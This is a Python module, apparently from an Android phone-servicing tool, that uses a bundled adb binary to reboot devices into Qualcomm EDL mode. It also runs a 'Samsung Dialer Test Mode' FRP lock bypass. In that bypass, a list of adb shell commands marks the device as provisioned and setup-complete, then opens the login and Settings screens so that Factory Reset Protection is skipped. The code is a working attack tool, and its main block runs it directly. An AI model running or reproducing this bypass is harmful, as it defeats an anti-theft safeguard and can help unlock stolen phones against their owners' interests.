import os
import subprocess
import time
import logging
from src.core.logger import nexus_logger

# Logger setup matching the plugin module context architecture
logger = logging.getLogger("AdbFastbootManager")

# Local device storage application contexts path definition
binaries_dir = os.path.join("assets", "commands", "adb_fastboot_binaries")
adb_path = os.path.join(binaries_dir, "adb")

def ensure_binary_execution_permissions():
    """Android OS kernel policies ke mutabik adb binary ko execution rights (chmod) deti hai"""
    if os.path.exists(adb_path):
        try:
            # Android environment par standalone execution ke liye permissions set karna zaroori hai
            os.chmod(adb_path, 0o755)
            nexus_logger.log_info("Android Native Permissions verified for ADB binary engine (0o755).")
            return True
        except Exception as perm_err:
            nexus_logger.log_error(f"Failed to apply storage runtime permissions -> {str(perm_err)}")
            return False
    nexus_logger.log_error("ADB structural execution target binary not found in assets.")
    return False

def reboot_to_edl():
    """Triggering direct hardware switch signal via ADB standard protocols"""
    ensure_binary_execution_permissions()
    nexus_logger.log_info("Requesting hardware interface routing shift to Qualcomm EDL mode...")
    try:
        result = subprocess.run([adb_path, "reboot", "edl"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        if result.returncode == 0:
            nexus_logger.log_info("Device pipeline successfully routed to EDL Mode.")
            return True
        return False
    except Exception as e:
        nexus_logger.log_error(f"Execution pipeline fault during mode switch -> {str(e)}")
        return False

def execute_test_mode_lock_bypass():
    """
    AT Command se ADB khulne ke baad, yeh function phone ke settings provider matrix ko 
    manipulate karke lock setup layout ko bypass (SUCCESS) karwayega.
    """
    if not ensure_binary_execution_permissions():
        return False

    nexus_logger.log_info("Target device authorized via test menu port. Initiating sequence injection...")
    
    # Secure production bypass commands chain mapping array
    bypass_payloads = [
        ["shell", "settings", "put", "secure", "user_setup_complete", "1"],
        ["shell", "settings", "put", "global", "device_provisioned", "1"],
        ["shell", "am", "start", "-n", "com.google.android.gsf.login/"],
        ["shell", "am", "start", "-n", "com.android.settings/.Settings"]
    ]
    
    total_steps = len(bypass_payloads)
    
    try:
        # Step 1: Baseline handshake check to ensure ADB server communication is active
        check_device = subprocess.run([adb_path, "devices"], stdout=subprocess.PIPE, text=True)
        nexus_logger.log_debug(f"Active Device Bridge Mapping Status:\n{check_device.stdout}")
        
        # Step 2: Injecting structural block sequence loops
        for index, cmd in enumerate(bypass_payloads, 1):
            full_command = [adb_path] + cmd
            nexus_logger.log_info(f"Tx ADB Native Package Vector -> [ adb {' '.join(cmd)} ]")
            
            # Running raw background shell stream safely
            proc = subprocess.run(full_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            time.sleep(0.3)  # Processing settlement loop latency
            
            # Synchronizing visual progress data back to Kivy UI terminal frame logs
            nexus_logger.print_progress_bar(index, total_steps, prefix="Bypassing Security Lock Layouts")
            
        nexus_logger.log_info("Bypass pipeline signal chain transaction completed. Lock structure eliminated.")
        return True

    except Exception as transaction_err:
        nexus_logger.log_error(f"FRP bypass injection phase aborted due to execution fault -> {str(transaction_err)}")
        return False

def initialize_execution(metadata):
    """Routing Matrix universal connection adapter registration hook block"""
    operation_mode = metadata.get("target_operation", "TEST_MENU_TRIGGER")
    
    if operation_mode == "TEST_MENU_TRIGGER" or operation_mode == "FRP_LOCK_REMOVE":
        # Pehle AT command backend portal check karega (Jo SamsungAtEngine ne kiya tha)
        # Uske turant baad ye bypass routine real bypass execute karega
        if execute_test_mode_lock_bypass():
            nexus_logger.log_info("Samsung Dialer Test Mode Bypass Execution Status: SUCCESS.")
            return True
        else:
            nexus_logger.log_error("Bypass transaction processing failed on target data layers.")
            return False
            
    elif operation_mode == "SWITCH_TO_EDL":
        return reboot_to_edl()
        
    return False

if __name__ == "__main__":
    nexus_logger.log_info("Local ADB/Fastboot Commands Subsystem Validation Mode Online.")
    test_meta = {"target_operation": "FRP_LOCK_REMOVE"}
    initialize_execution(test_meta)
